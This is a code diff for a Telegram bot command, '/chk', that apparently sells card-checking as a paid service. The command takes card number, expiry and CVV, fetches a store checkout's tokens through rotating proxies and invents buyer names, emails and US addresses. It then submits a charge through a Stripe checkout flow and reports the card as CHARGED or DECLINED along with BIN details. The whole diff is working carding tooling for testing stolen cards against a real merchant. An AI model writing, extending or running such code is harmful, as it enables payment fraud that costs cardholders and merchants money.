+            f"<b>Example:</b> <code>/chk 4111111111111111|12|26|123</code>",
+            parse_mode="HTML"
+        )
         return
 
     parts = card_str.split("|")
     if len(parts) != 4:
-        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
+        await update.message.reply_text("❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>",
+                                        parse_mode="HTML")
         return
+
     cc_num, mm, yy, cvv = parts
     if len(yy) == 4: yy = yy[-2:]
-    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}
+    card_data    = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}
+    card_display = f"{cc_num}|{mm.zfill(2)}|{yy}|{cvv}"
+    bin_num      = cc_num[:6]
 
-    ud = get_user_data(user.id, context)
+    # ── Credit check ─────────────────────────────────────────────────
+    ud      = get_user_data(uid, context)
     premium = is_user_premium(ud)
 
     if not premium:
         if ud.get("credits", 0) <= 0:
-            await update.message.reply_text("<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n━━━━━━━━━━━━━━━━━\nYou have no credits left.\nRedeem a code with /rm or buy a plan.\n━━━━━━━━━━━━━━━━━", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")], [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)]]))
+            await update.message.reply_text(
+                f"{E_ERRORS} <b>No Credits</b>\n──────────\n"
+                "You have no credits left.\n"
+                "Redeem a code with /rm or buy a plan.",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
+                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)],
+                ])
+            )
             return
         ud["credits"] -= 1
 
-    msg = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Pʀᴏᴄᴇꜱꜱɪɴɢ...</b>", parse_mode="HTML")
+    # ── Checking message ─────────────────────────────────────────────
+    msg = await update.message.reply_text(
+        f"{E_PROGRESS} <b>Checking…</b>\n"
+        f"{E_GATE} Gate ➳ {GATE_NAME}\n"
+        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>'
+        f" Card ➳ <code>{escape(card_display)}</code>",
+        parse_mode="HTML"
+    )
     start_time = time.time()
-    bin_num = card_str[:6]
+
+    # ── Run the 4-step Stripe gate ───────────────────────────────────
+    status     = "ERROR"
+    raw_resp   = "Unknown error"
+    status_ui  = "error"
 
     try:
         timeout = aiohttp.ClientTimeout(total=60)
-        proxy = random.choice(PROXIES) if PROXIES else None
-        
+        proxy   = random.choice(PROXIES) if PROXIES else None
+
         async with aiohttp.ClientSession(timeout=timeout) as session:
             crumb = await step0_get_crumb(session, proxy)
             if not crumb: raise Exception("Failed to get crumb token")
@@ -307,56 +460,129 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             xsrf, grand_total = await step1b_get_xsrf_and_total(session, cart_token, proxy)
             if not xsrf or not grand_total: raise Exception("Failed to parse checkout page")
 
-            fn, ln = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
-            full_name = f"{fn} {ln}"
-            email = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@{random.choice(EMAIL_DOMAINS)}"
-            address_info = random.choice(US_STREETS), *random.choice(US_CITIES)
+            fn, ln     = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
+            full_name  = f"{fn} {ln}"
+            email      = (f"{fn.lower()}{ln.lower()}"
+                          f"{random.randint(1,99999)}@{random.choice(EMAIL_DOMAINS)}")
+            city_info  = random.choice(US_CITIES)           # (city, state, zip)
+            street     = random.choice(US_STREETS)
+            address_info = (street, *city_info)
 
-            pm, err = await step2_create_pm(session, card_data, full_name, email, address_info, proxy)
-            if err:
-                status_ui = "Dᴇᴄʟɪɴᴇᴅ ❌"
-                raw_response = err
+            pm, pm_err = await step2_create_pm(
+                session, card_data, full_name, email, address_info, proxy
+            )
+            if pm_err:
+                # pm creation already gave us a verdict string
+                raw_resp  = pm_err
+                status    = "DECLINED" if "DECLINED" in pm_err else "ERROR"
+                status_ui = status.lower()
             else:
-                status, raw_response = await step3_submit(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy)
-                status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"
+                status, raw_resp = await step3_submit(
+                    session, cart_token, pm, full_name, email,
+                    crumb, xsrf, address_info, grand_total, proxy
+                )
+                status_ui = status.lower()
 
-        bin_data = await get_bin_info(bin_num)
-        bin_txt = "N/A"
-        if not bin_data.get("error"):
-            s = str(bin_data.get("scheme", "N/A")).upper()
-            b = bin_data.get("bank", "N/A")
-            country = str(bin_data.get("country", "N/A")).upper()
-            flag = bin_data.get("country_emoji", "")
-            bin_txt = f"{s} - {b} - {flag} {country}"
-            
-        raw_plan = ud.get('plan', 'TRIAL').upper()
-        plan_ui = get_styled_plan(raw_plan)
-        username = user.first_name or "User"
-        elapsed = f"{time.time() - start_time:.2f}"
+        # ── BIN lookup (parallel would need extra refactor; keep sequential) ──
+        try:
+            bin_data = await asyncio.wait_for(get_bin_info(bin_num), timeout=8)
+        except Exception:
+            bin_data = {"error": True}
 
-        safe_response = escape(str(raw_response))
-        
-        text = (
-            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
-            f"🔍 ➺ <code>{card_str}</code>\n"
-            f"Gᴀᴛᴇ ➺ {GATE_NAME}\n"
-            f"Rᴀᴡ ➺ {safe_response}\n"
-            f"Iɴꜰᴏ ➺ {bin_txt}\n"
-            f"Uꜱᴇʀ ➺ {username} ({plan_ui})\n"
-            f"Tɪᴍᴇ ➺ {elapsed}s\n"
-            f"Pʀᴏ ➺ Batman⚡\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"📢 @Batcardchk"
+    except asyncio.TimeoutError:
+        if not premium:
+            ud["credits"] = ud.get("credits", 0) + 1   # refund
+        await msg.edit_text(
+            f"{E_ERRORS} <b>Timeout</b>\n──────────\nAPI took too long. Try again.",
+            parse_mode="HTML"
         )
-        
-        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb_result(premium), disable_web_page_preview=True)
-        
-    except asyncio.TimeoutError: 
-        if not premium: ud["credits"] = ud.get("credits", 0) + 1
-        await msg.edit_text("<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n━━━━━━━━━━━━━━━━━\nAPI took too long. Try again.\n━━━━━━━━━━━━━━━━━", parse_mode="HTML")
-    except Exception as e: 
-        if not premium: ud["credits"] = ud.get("credits", 0) + 1
-        await msg.edit_text(f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n━━━━━━━━━━━━━━━━━\n<code>{escape(str(e)[:120])}</code>\n━━━━━━━━━━━━━━━━━", parse_mode="HTML")
+        return
+    except Exception as e:
+        if not premium:
+            ud["credits"] = ud.get("credits", 0) + 1   # refund
+        await msg.edit_text(
+            f"{E_ERRORS} <b>Error</b>\n──────────\n"
+            f"<code>{escape(str(e)[:160])}</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    # ── Build result ─────────────────────────────────────────────────
+    elapsed  = time.time() - start_time
+    uname    = f"@{user.username}" if user.username else user.first_name or "User"
+    plan_str = ud.get("plan", "TRIAL")
+    plan_eid = get_plan_emoji_id(plan_str)
+
+    # BIN line
+    bin_txt = "N/A"
+    if bin_data and not bin_data.get("error"):
+        s  = str(bin_data.get("scheme","N/A")).upper()
+        bk = bin_data.get("bank","N/A")
+        co = str(bin_data.get("country","N/A")).upper()
+        fl = bin_data.get("country_emoji","")
+        bin_txt = f"{s} - {bk} - {fl} {co}".strip(" -")
+
+    # Status line with tg-emoji
+    if status == "CHARGED":
+        le         = get_random_live_emoji()
+        status_line = (
+            f'<b><a href="{CHANNEL_LINK}">[❆]</a> CHARGED '
+            f'<tg-emoji emoji-id="{le}">✅</tg-emoji></b>'
+        )
+    elif status == "DECLINED":
+        status_line = f'{E_DECLINED} <b>DECLINED</b>'
+    else:
+        status_line = f'{E_ERRORS} <b>ERROR</b>'
+
+    body = (
+        f"{status_line}\n"
+        f"──────────\n"
+        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
+        f"<b>   ⤷ <code>{escape(card_display)}</code></b>\n"
+        f"<b>Gate ➳ {GATE_NAME}</b>\n"
+        f"──────────\n"
+        f"<b>Resp ➳ {escape(str(raw_resp)[:160])}</b>\n"
+        f"<b>Bin  ➳ <code>{escape(bin_txt)}</code></b>\n"
+        f"──────────\n"
+        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji>'
+        f" ➳ {elapsed:.2f}s</b>\n"
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji>'
+        f" ➳ {escape(uname)} "
+        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
+        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji>'
+        f' ➳ <a href="{DEV_LINK}">{BOT_NAME}</a> '
+        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+    )
+
+    try:
+        await msg.edit_text(
+            body, parse_mode="HTML",
+            reply_markup=kb_result(premium),
+            disable_web_page_preview=True
+        )
+    except Exception:
+        await update.message.reply_text(
+            body, parse_mode="HTML",
+            reply_markup=kb_result(premium),
+            disable_web_page_preview=True
+        )
+
+    # ── DM only for CHARGED ──────────────────────────────────────────
+    if status == "CHARGED":
+        try:
+            await context.bot.send_message(
+                chat_id=uid, text=body,
+                parse_mode="HTML", disable_web_page_preview=True
+            )
+        except Exception:
+            pass
+
+        # Update stats
+        ud["approved_checks"] = ud.get("approved_checks", 0) + 1
+
+    ud["total_checks"] = ud.get("total_checks", 0) + 1
+    ud["last_gate"]    = GATE_NAME
+    ud["last_active"]  = time.strftime("%Y-%m-%d %H:%M")
 
 def get_chk_handler():
     return CommandHandler("chk", cmd_chk)
